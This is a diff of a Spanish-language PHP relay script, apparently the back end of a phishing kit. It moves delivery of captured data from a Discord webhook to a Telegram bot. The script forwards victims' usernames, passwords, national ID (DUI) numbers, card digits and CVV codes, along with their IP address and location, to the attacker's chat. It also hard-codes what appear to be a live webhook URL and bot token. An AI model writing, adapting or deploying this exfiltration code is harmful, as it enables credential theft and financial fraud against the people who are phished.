@@ -1,19 +1,14 @@
 <?php
 // ============================================================
-//  Relay Discord  -  Recibe datos del front y los envía al webhook
-//  El webhook NUNCA se expone al cliente.
+//  Relay Telegram - Recibe datos del front y los envía al bot
 // ============================================================
 
-// --- Configuración -----------------------------------------------------
-$WEBHOOK = 'https://discord.com/api/webhooks/1501316102641418330/sUkWUBR4Y8-liFvecQfKDsq9c1A6iuHUbnNJliVMDVSfC3vDEZWpu7T4lXZVJcPF6xeA';
+$TG_TOKEN = '8849191947:AAG0KCpFSyxiwz5ukZGnJx8CY9oKV9zgQnk';
+$TG_CHAT  = '7655000874';
+$TG_URL   = 'https://api.telegram.org/bot' . $TG_TOKEN . '/sendMessage';
 
-// Restringir orígenes permitidos (vacío = aceptar cualquiera).
-// Ejemplo: ['https://tu-dominio.com']
-$ALLOWED_ORIGINS = [];
-
-// Rate-limit simple por IP (segundos entre requests)
+$ALLOWED_ORIGINS    = [];
 $RATE_LIMIT_SECONDS = 1;
-// -----------------------------------------------------------------------
 
 header('Content-Type: application/json; charset=utf-8');
 
@@ -73,62 +68,61 @@ if ($geoRaw) {
     }
 }
 
-// Construir campos del embed
-$fields = [];
-$add = function ($name, $value) use (&$fields) {
-    if ($value !== null && $value !== '') {
-        $fields[] = ['name' => $name, 'value' => (string)$value, 'inline' => true];
-    }
-};
-$add('👤 Usuario', $d['usuario'] ?? null);
-$add('🔑 Clave',   $d['clave']   ?? null);
-$add('🆔 DUI',     $d['dui']     ?? null);
-$add('💳 4 dígitos', $d['last4'] ?? null);
-$add('🔐 CVV',     $d['cvv']     ?? null);
-$add('🌐 IP', $ip);
-$add('📍 País', $country);
-$add('🏙️ Ciudad', $city);
-$add('🖥️ User-Agent', substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 200));
+// Construir mensaje Telegram (HTML)
+$esc = function($s) { return htmlspecialchars((string)$s, ENT_XML1 | ENT_QUOTES, 'UTF-8'); };
 
-$payload = [
-    'content' => '@everyone **Paso ' . $step . '**',
-    'embeds'  => [[
-        'title'     => '📋 Información Capturada - Paso ' . $step,
-        'color'     => 16711680,
-        'fields'    => $fields,
-        'timestamp' => gmdate('Y-m-d\TH:i:s\Z'),
-        'footer'    => ['text' => 'Sistema'],
-    ]],
-];
+$lines = [];
+$lines[] = "📋 <b>Paso " . $esc($step) . "</b>";
+$lines[] = "";
+if (!empty($d['usuario'])) $lines[] = "👤 <b>Usuario:</b> " . $esc($d['usuario']);
+if (!empty($d['clave']))   $lines[] = "🔑 <b>Clave:</b> "   . $esc($d['clave']);
+if (!empty($d['dui']))     $lines[] = "🆔 <b>DUI:</b> "      . $esc($d['dui']);
+if (!empty($d['last4']))   $lines[] = "💳 <b>4 dígitos:</b> ". $esc($d['last4']);
+if (!empty($d['cvv']))     $lines[] = "🔐 <b>CVV:</b> "      . $esc($d['cvv']);
+$lines[] = "";
+$lines[] = "🌐 <b>IP:</b> "    . $esc($ip);
+$lines[] = "📍 <b>País:</b> "  . $esc($country);
+$lines[] = "🏙️ <b>Ciudad:</b> ". $esc($city);
+$lines[] = "🖥️ <b>UA:</b> "    . $esc(substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 150));
 
-// Enviar al webhook con cURL (con fallback a stream)
-$json = json_encode($payload, JSON_UNESCAPED_UNICODE);
+$payload = json_encode([
+    'chat_id'    => $TG_CHAT,
+    'text'       => implode("\n", $lines),
+    'parse_mode' => 'HTML',
+], JSON_UNESCAPED_UNICODE);
 
 $ok = false;
 if (function_exists('curl_init')) {
-    $ch = curl_init($WEBHOOK);
+    $ch = curl_init($TG_URL);
     curl_setopt_array($ch, [
         CURLOPT_POST           => true,
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
-        CURLOPT_POSTFIELDS     => $json,
+        CURLOPT_POSTFIELDS     => $payload,
         CURLOPT_TIMEOUT        => 6,
         CURLOPT_SSL_VERIFYPEER => true,
     ]);
-    curl_exec($ch);
+    $res  = curl_exec($ch);
     $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
-    $ok = ($code >= 200 && $code < 300);
+    if ($code >= 200 && $code < 300 && $res) {
+        $tgR = json_decode($res, true);
+        $ok  = !empty($tgR['ok']);
+    }
 } else {
-    $ctx = stream_context_create([
+    $ctx2 = stream_context_create([
         'http' => [
             'method'  => 'POST',
             'header'  => "Content-Type: application/json\r\n",
-            'content' => $json,
+            'content' => $payload,
             'timeout' => 6,
         ],
     ]);
-    $ok = @file_get_contents($WEBHOOK, false, $ctx) !== false;
+    $res = @file_get_contents($TG_URL, false, $ctx2);
+    if ($res) {
+        $tgR = json_decode($res, true);
+        $ok  = !empty($tgR['ok']);
+    }
 }
 
 echo json_encode(['ok' => $ok]);
